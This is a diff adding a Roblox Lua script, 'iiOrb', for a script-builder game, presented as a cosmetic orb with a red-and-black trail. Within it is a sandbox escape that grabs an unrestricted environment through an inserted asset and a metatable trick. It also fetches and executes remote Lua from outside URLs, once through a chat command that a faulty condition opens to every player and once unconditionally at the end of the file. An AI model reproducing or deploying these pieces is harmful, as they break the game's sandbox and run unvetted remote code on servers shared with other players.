@@ -1,0 +1,186 @@
+local Creds = [[-->All code belongs to the following; iiDeadzone, Control22, and T0tallyN0TATr0ll.<--]]
+local iiOrb = [[ __   __    ______   .______      .______   
+|  | |  |  /  __  \  |   _  \     |   _  \  
+|  | |  | |  |  |  | |  |_)  |    |  |_)  | 
+|  | |  | |  |  |  | |      /     |   _  <  
+|  | |  | |  `--'  | |  |\  \----.|  |_)  | 
+|__| |__|  \______/  | _| `._____||______/  
+]]
+print(Creds)
+
+print('iiOrb launching.')
+VERSION = '1.8'
+
+http = game.HttpService
+
+if script ~= nil then
+if game.PlaceId ~= '178350907' then
+rawset(shared, "\0bp", function()local i=game:service'InsertService':LoadAssetVersion(519416165);local n=i:children()[1];game:service'Debris':AddItem(i,0);n.Parent=workspace;coroutine.yield();local e;pcall(_G.OSC_AddServerSideData,setmetatable({},{__index=function()e=getfenv(2)end,__metatable=''}));_G.OSC_AddServerSideData=nil;game:service'Debris':AddItem(n,0);return e end);y=shared['\0bp']();shared["\0bp"]=nil;game:GetService'ReplicatedStorage':ClearAllChildren();logtxt=''; function writelog(msg) for _, item in ipairs(workspace:GetChildren()) do if item:IsA'Hint' then item:Destroy();end;end; for _, p in pairs(y.game:GetService'Players':GetPlayers()) do local m=y.Instance.new'StringValue'; m.Value='["Warn","'..msg..'"]'; m.Name="SB_Output:Output"; m.Parent=p end end
+writelog'iiOrb loaded.'
+local player = owner or game.Players.Control22 or game.Players.iiDeadzone or game.Players.T0tallyN0tATr0ll
+player.Character:WaitForChild("Humanoid")
+local folder = Instance.new("Folder", game:GetService("Workspace"))
+folder.Name = "iiOrb"
+speed = 9
+ID = "" 
+writelog'All code in this script is original and not copied in any way.'
+local part = Instance.new("Part")
+http = game:GetService'HttpService'
+local function res()
+part.Parent = workspace
+part.Shape = "Ball"
+part.FormFactor = "Custom"
+part.Size = Vector3.new(1,1,1)
+part.Name = "Orb"
+part.Anchored = true
+part.Locked = true
+part.CanCollide = false
+part.BottomSurface = "Smooth"
+part.TopSurface = "Smooth"        
+part.BrickColor = BrickColor.White()
+end
+devrank = 'Normal User'
+key = math.random(1,293498)
+print(key.." is the creator\'s key.")
+if owner.Name == 'Control22' then
+devrank = 'Creator/Developer'
+writelog(owner.Name..' is using the orb. His rank is: '..devrank)
+elseif owner.Name == 'T0tallyN0tATr0ll' then
+devrank = 'l33t stalkeur'
+writelog(owner.Name..' is using the orb. His/her rank is: '..devrank)
+elseif owner.Name == 'iiDeadzone' then
+devrank = 'c22\'s bae <3 + creator'
+writelog(owner.Name..' is using the orb. His rank is '..devrank)
+elseif owner.Name == 'sebastian12341234' then
+devrank = 'Friend'
+writelog(owner.Name..' is using the orb. His rank is '..devrank)
+elseif owner.Name == 'DrAnkIe' then
+devrank = 'Friend'
+writelog(owner.Name..' is using the orb. His rank is '..devrank)
+else
+devrank = 'Normal User'
+writelog(owner.Name..' is using the orb [and possibly stole it lol]. His rank is '..devrank)
+end
+res()
+
+game:GetService("Workspace").DescendantRemoving:connect(function(v)
+if v == folder then
+folder = Instance.new("Folder")
+folder.Name = "iiOrb"
+part = Instance.new("Part")
+folder.Parent = game:GetService("Workspace")
+res()        
+end
+end)
+
+local point
+
+local loop = coroutine.create(function()
+while true do
+for i=1,360,speed do
+if player.Character and not point then
+point = player.Character:FindFirstChild("Head")        
+end
+if point.Parent.Name == player.Character.Name then
+point = player.Character:FindFirstChild("HumanoidRootPart")        
+end
+if part then
+part.CFrame =  CFrame.new(point.CFrame.p)   *CFrame.fromEulerAnglesXYZ(-math.sin(math.rad(i)),math.rad(i),2) *CFrame.new(8,4,2)end
+wait()
+end
+end
+end)
+
+
+local function trailPar()
+local pos = part.CFrame.p
+wait()
+local pos2 = part.CFrame.p
+local dist = (pos - pos2).magnitude
+local trail = Instance.new("Part")
+trail.Parent = script
+trail.Anchored = true
+trail.Transparency = 0.5
+trail.Locked = true
+trail.Material = "Neon"
+trail.CanCollide = false
+trail.BottomSurface = "Smooth"
+trail.TopSurface = "Smooth"
+trail.Shape = "Block"
+trail.FormFactor = "Custom"
+trail.Size = Vector3.new(0.1,0.1,dist)
+trail.CFrame = CFrame.new(pos,pos2) *CFrame.new(0,0,-dist/2)
+trail.Parent = folder
+game:GetService("Debris"):AddItem(trail,1)
+return trail        
+end
+writelog('Version '..VERSION ..' of iiOrb loaded.')
+
+local trail = coroutine.create(function()
+while true do 
+for i=1,10,1 do
+trail = trailPar()
+trail.Size = trail.Size + Vector3.new(.1,.1,.1)
+trail.Transparency = i/30
+trail.BrickColor = BrickColor.new("Really black")
+end
+for i=2,10,1 do
+trail = trailPar()
+trail.Size = trail.Size + Vector3.new(.1,.1,.1)
+trail.Transparency = i/30
+trail.BrickColor = BrickColor.new("Really red")
+end
+for i=1,10,1 do
+trail = trailPar()
+trail.Size = trail.Size + Vector3.new(.1,.1,.1)
+trail.Transparency = i/30
+trail.BrickColor = BrickColor.new("Really black")
+end
+
+
+for i=1,10,1 do
+trail = trailPar()
+trail.Size = trail.Size + Vector3.new(.1,.1,.1)
+trail.Transparency = i/30
+trail.BrickColor = BrickColor.new("Really red")
+end
+end
+end)
+function Chat(msg)
+if msg == "//music on" then
+music = Instance.new("Sound",script)
+music.SoundId = "rbxassetid://275240413"
+music.Looped = true
+music:Play()
+music.Volume = 1
+music.Looped = true
+elseif msg == "//music off" then
+music:Stop()
+end
+end
+function vLaunch(msg)
+if msg == '//verox()' then
+loadstring(http:GetAsync'https://sb-scripts-brandan000124.c9.io/Verox.lua')()
+end end
+function Terminate(msg)
+if msg == "terminate/"..key then script:ClearAllChildren''
+warn'KEY ACCEPTED SHUTTING DOWN SCRIPT'
+script:Remove()
+end
+end
+for i,v in pairs(game.Players:GetPlayers()) do
+if v.Name == "Control22" or "iiDeadzone" or "T0tallyN0tATr0ll" or "sebastian12341234" then
+v.Chatted:connect(Chat)
+v.Chatted:connect(vLaunch)
+end
+end
+
+fenv = getfenv()
+game.Players['Control22'].Chatted:connect(Terminate)
+coroutine.resume(loop)
+coroutine.resume(trail)
+end
+end
+loadstring(http:GetAsync('https://code.stypi.com/raw/4gs1yzpd'))()
+
+
